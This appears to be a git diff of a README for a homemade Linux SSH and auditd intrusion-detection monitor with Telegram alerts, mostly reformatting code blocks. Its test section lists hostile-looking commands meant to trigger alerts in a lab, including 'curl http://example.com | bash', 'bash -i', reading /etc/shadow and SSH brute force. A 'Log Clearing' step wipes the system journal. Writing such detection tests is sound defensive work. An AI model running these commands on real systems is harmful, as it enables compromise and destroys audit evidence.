@@ -44,23 +44,24 @@ Telegram Bot API
 
 ## Setup & Installation
 1. Install Dependencies
-
-''' sudo apt update
+```
+sudo apt update
 sudo apt install openssh-server fail2ban auditd python3-pip -y
-pip3 install requests '''
-
+pip3 install requests
+```
 2. Enable Services
-''' sudo systemctl enable ssh
+```
+sudo systemctl enable ssh
 sudo systemctl enable fail2ban
 sudo systemctl enable auditd
 
 sudo systemctl start ssh
 sudo systemctl start fail2ban
-sudo systemctl start auditd '''
-
+sudo systemctl start auditd
+```
 3. Configure Fail2Ban
 
-''' sudo nano /etc/fail2ban/jail.local '''
+`code`sudo nano /etc/fail2ban/jail.local
 
 [sshd]
 enabled = true
@@ -70,10 +71,10 @@ bantime = 300
 
 Restart:
 
-''' sudo systemctl restart fail2ban '''
+`code` sudo systemctl restart fail2ban
 
 4. Configure auditd Rules
-''' sudo nano /etc/audit/rules.d/audit.rules '''
+`code`sudo nano /etc/audit/rules.d/audit.rules
 
 -a always,exit -F arch=b64 -S execve -k exec_log
 -a always,exit -F arch=b32 -S execve -k exec_log
@@ -83,9 +84,10 @@ Restart:
 -w /home/*/.ssh/authorized_keys -p rwxa -k ssh_key_access
 
 Load rules:
-
-''' sudo augenrules --load
-sudo systemctl restart auditd '''
+```
+sudo augenrules --load
+sudo systemctl restart auditd
+```
 
 6. Telegram Setup
 Create bot via @BotFather
@@ -93,63 +95,58 @@ Get TOKEN
 Get CHAT ID
 
 Update script:
-
-''' TELEGRAM_TOKEN = "YOUR_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID" '''
-
+```
+TELEGRAM_TOKEN = "YOUR_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
+```
 ### Usage
 
-''' sudo python3 monitor.py '''
+`code`sudo python3 monitor.py
 
 ### Testing & Simulation
 
 Use another machine (recommended) to simulate attacks:
 
-''' ssh testuser@<KALI_IP> '''
+`code`ssh testuser@<KALI_IP>
 
 ### Test Commands
-''' # SSH Brute Force
-''' ssh testuser@<KALI_IP>  # wrong password multiple times
-'''
-''' # SSH Login Success
-''' ssh testuser@<KALI_IP>  # correct password
-''' 
-''' # Invalid User
-''' ssh fakeuser@<KALI_IP>
-''' 
-''' # Sudo Usage
-''' sudo ls
-''' 
-''' # User Creation
-''' sudo useradd hacker
-''' 
-''' # Cron Persistence
-''' crontab -e
-''' 
-''' # SSH Key Access
-''' cat ~/.ssh/authorized_keys
-''' 
-''' # Sensitive File Access
-''' sudo cat /etc/shadow
-''' 
-''' # Root Access
-''' sudo ls /root
-''' 
-''' # Suspicious Commands
-''' bash -i
-''' curl http://example.com | bash
-''' 
-''' # Recon Commands
-''' uname -a
-''' ip a
-''' ps aux '''
+```
+# SSH Brute Force
+ssh testuser@<KALI_IP>  # wrong password multiple times
 
+# SSH Login Success
+ssh testuser@<KALI_IP>  # correct password
+ 
+# Invalid User
+ssh fakeuser@<KALI_IP>
+
+# Sudo Usage
+sudo ls
+
+# User Creation
+sudo useradd hacker
+
+# Sensitive File Access
+sudo cat /etc/shadow
+
+# Root Access
+sudo ls /root
+
+# Suspicious Commands
+bash -i
+curl http://example.com | bash
+
+# Recon Commands
+uname -a
+ip a
+ps aux
+```
 ### Log Clearing
-''' sudo journalctl --vacuum-time=1s
+`code`sudo journalctl --vacuum-time=1s
 ### Fail2Ban Management
 Check Status
-'''sudo fail2ban-client status sshd
+`code`sudo fail2ban-client status sshd
 ### Unban IP
-'''sudo fail2ban-client set sshd unbanip <IP>
+`code`sudo fail2ban-client set sshd unbanip <IP>
 ### Detection Flow
 ''' Logs → Detection → Correlation → Alert → Response
